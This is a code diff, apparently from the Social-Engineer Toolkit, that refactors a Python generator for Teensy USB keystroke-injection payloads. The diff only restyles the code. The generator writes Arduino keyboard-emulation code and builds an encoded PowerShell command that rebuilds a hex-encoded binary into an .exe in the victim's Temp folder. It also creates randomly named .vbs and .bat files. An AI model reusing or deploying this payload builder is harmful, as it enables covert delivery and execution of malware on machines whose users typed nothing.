@@ -69,11 +69,8 @@ with open("converts.txt", "w") as filewrite:
 print("[*] File converted successfully. It has been exported in the working directory under 'converts.txt'. "
       "Copy this one file to the teensy SDCard.")
 
-output_variable = "/*\nTeensy Hex to File SDCard Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)\n" \
-                  "Reading from a SD card.  Based on code from: http://arduino.cc/en/Tutorial/DumpFile\n*/\n\n"
-
 # this is used to write out the file
-random_filename = core.generate_random_string(8, 15) + ".txt"
+random_filename = f"{core.generate_random_string(8, 15)}.txt"
 
 # powershell command here, needs to be unicoded then base64 in order to
 # use encodedcommand
@@ -83,34 +80,22 @@ powershell_command = ("$s=gc \"$HOME\\AppData\\Local\\Temp\\{random_filename}\";
                       "0..$($b.Length-1)|%{{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)}};"
                       "[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\{random_filename}.exe\",$b)".format(random_filename=random_filename))
 
-##########################################################################
-#
-# there is an odd bug with python unicode, traditional unicode inserts a
-# null byte after each character typically.. python does not so the encoded
-# command becomes corrupt in order to get around this a null byte is pushed
-# to each string value to fix this and make the encodedcommand work properly
-#
-##########################################################################
-
-# blank command will store our fixed unicode variable
-blank_command = ""
-# loop through each character and insert null byte
-for char in powershell_command:
-    # insert the nullbyte
-    blank_command += char + "\x00"
-
+blank_command = "".join(char + "\x00" for char in powershell_command)
 # assign powershell command as the new one
 powershell_command = blank_command
 # base64 encode the powershell command
 powershell_command = base64.b64encode(powershell_command)
 
 # vbs filename
-vbs = core.generate_random_string(10, 15) + ".vbs"
+vbs = f"{core.generate_random_string(10, 15)}.vbs"
 # .batch filename
-bat = core.generate_random_string(10, 15) + ".bat"
+bat = f"{core.generate_random_string(10, 15)}.bat"
 
-# write the rest of the teensy code
-output_variable += (r"""
+output_variable = (
+    "/*\nTeensy Hex to File SDCard Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)\n"
+    "Reading from a SD card.  Based on code from: http://arduino.cc/en/Tutorial/DumpFile\n*/\n\n"
+    + (
+        r"""
 
 #include <avr/pgmspace.h>
 #include <SD.h>
@@ -228,7 +213,14 @@ Keyboard.send_now();
 Keyboard.set_key1(0);
 Keyboard.send_now();
 }}
-""".format(random_filename=random_filename, encodedcommand=core.powershell_encodedcommand(powershell_command), vbs=vbs, bat=bat))
+""".format(
+            random_filename=random_filename,
+            encodedcommand=core.powershell_encodedcommand(powershell_command),
+            vbs=vbs,
+            bat=bat,
+        )
+    )
+)
 # delete temporary file
 subprocess.Popen("rm {0} 1> /dev/null 2>/dev/null".format(random_filename), shell=True).wait()
 print("[*] Binary to Teensy file exported as teensy.ino")
